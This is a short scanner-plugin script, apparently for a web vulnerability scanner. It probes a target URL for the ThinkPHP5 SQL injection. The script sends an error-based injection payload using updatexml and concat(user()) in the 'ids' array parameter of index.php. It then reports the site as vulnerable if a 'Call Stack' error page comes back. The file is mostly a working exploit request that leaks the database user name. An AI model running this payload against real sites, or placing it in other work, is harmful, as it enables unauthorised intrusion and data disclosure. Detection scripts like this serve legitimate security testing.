#request url = var
#define payload =/index.php?ids[0,updatexml(0,concat(0xa,user()),0)]=1
#define bug = Call Stack
#define info = 存在ThinkPHP5 SQL Injection Vulnerability && Sensitive Information Disclosure Vulnerability

function main(args)
{
	res = HttpGet(url.payload,"User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:85.0) Gecko/20100101 Firefox/85.0");
	if(StrFindStr(res[0],bug,0)!= "-1")
	{
		print(url.info);
	}
}
